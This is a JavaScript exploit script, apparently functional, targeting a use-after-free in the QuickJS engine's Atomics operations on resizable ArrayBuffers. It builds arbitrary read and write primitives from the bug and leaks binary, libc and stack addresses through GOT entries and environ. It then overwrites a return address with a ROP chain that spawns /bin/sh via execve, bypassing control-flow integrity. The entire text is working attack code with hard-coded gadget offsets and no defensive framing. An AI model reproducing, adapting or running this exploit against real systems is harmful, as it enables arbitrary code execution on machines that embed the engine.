// QuickJS Atomics UAF Exploit - CFI Bypass via ROP
// Spawns /bin/sh via execve syscall, bypassing CFI

// CFI Binary offsets
const JS_ARRAY_BUFFER_FREE_OFFSET = 0x107df0n;
const FREE_GOT_OFFSET = 0x111768n;
const ENVIRON_GOT_OFFSET = 0x111708n;

// Libc offsets
const FREE_LIBC_OFFSET = 0xa3240n;
const POP_RDI_RET = 0x2a145n;
const POP_RSI_RET = 0x2baa9n;
const POP_RDX_RBX_RET = 0x8f0c5n;
const POP_RAX_RET = 0x43c23n;
const SYSCALL = 0x28505n;
const BIN_SH = 0x1a7ea4n;

let keep = [];

function create_arb_read(addr) {
    let trigger = new ArrayBuffer(56, { maxByteLength: 65536 });
    let view = new BigUint64Array(trigger);
    for (let i = 0; i < view.length; i++) view[i] = 0n;
    let victim = null;
    let mal = {
        valueOf: function() {
            trigger.resize(60000);
            victim = new ArrayBuffer(64);
            return addr;
        }
    };
    Atomics.exchange(view, 2, mal);
    keep.push(trigger, victim);
    return new DataView(victim);
}

function arb_read_u64(addr) {
    return create_arb_read(addr).getBigUint64(0, true);
}

function create_arb_write(addr) {
    let trigger = new ArrayBuffer(56, { maxByteLength: 65536 });
    let view = new BigUint64Array(trigger);
    for (let i = 0; i < view.length; i++) view[i] = 0n;
    let victim = null;
    let mal = {
        valueOf: function() {
            trigger.resize(60000);
            victim = new ArrayBuffer(256);
            return addr;
        }
    };
    Atomics.exchange(view, 2, mal);
    keep.push(trigger, victim);
    return new DataView(victim);
}

// Step 1: Leak binary base via js_array_buffer_free pointer
let leak_ab = new ArrayBuffer(56, { maxByteLength: 65536 });
let leak_view = new BigUint64Array(leak_ab);
for (let i = 0; i < leak_view.length; i++) leak_view[i] = 0n;
let fill = [];
let mal_leak = {
    valueOf: function() {
        leak_ab.resize(60000);
        for (let i = 0; i < 5; i++) fill.push(new ArrayBuffer(32));
        return 0n;
    }
};
let code_ptr = Atomics.add(leak_view, 6, mal_leak);
let binary_base = code_ptr - JS_ARRAY_BUFFER_FREE_OFFSET;
keep.push(leak_ab, fill);

// Step 2: Leak libc base via free@GOT
let free_libc = arb_read_u64(binary_base + FREE_GOT_OFFSET);
let libc_base = free_libc - FREE_LIBC_OFFSET;

// Step 3: Leak stack via environ
let environ_libc_addr = arb_read_u64(binary_base + ENVIRON_GOT_OFFSET);
let stack_ptr = arb_read_u64(environ_libc_addr);

// Step 4: Find eval_buf return address on stack
let binary_end = binary_base + 0x200000n;
let target_addr = 0n;

for (let offset = 0x400n; offset < 0x1000n; offset += 8n) {
    let addr = stack_ptr - offset;
    try {
        let val = arb_read_u64(addr);
        // Look for binary code pointer in eval_buf/main area
        if (val >= binary_base + 0x3c000n && val < binary_base + 0x40000n) {
            target_addr = addr;
            break;
        }
    } catch(e) {}
}

// Step 5: Build and write ROP chain for execve("/bin/sh", NULL, NULL)
let pop_rdi = libc_base + POP_RDI_RET;
let pop_rsi = libc_base + POP_RSI_RET;
let pop_rdx_rbx = libc_base + POP_RDX_RBX_RET;
let pop_rax = libc_base + POP_RAX_RET;
let syscall_gadget = libc_base + SYSCALL;
let bin_sh = libc_base + BIN_SH;

let rop = [
    pop_rdi,        // pop rdi; ret
    bin_sh,         // rdi = "/bin/sh"
    pop_rsi,        // pop rsi; ret
    0n,             // rsi = NULL
    pop_rdx_rbx,    // pop rdx; pop rbx; ret
    0n,             // rdx = NULL
    0n,             // rbx = junk
    pop_rax,        // pop rax; ret
    59n,            // rax = 59 (execve syscall number)
    syscall_gadget, // syscall
];

let write_dv = create_arb_write(target_addr);
for (let i = 0; i < rop.length; i++) {
    write_dv.setBigUint64(i * 8, rop[i], true);
}

// Script ends, return address triggers ROP chain, shell spawns
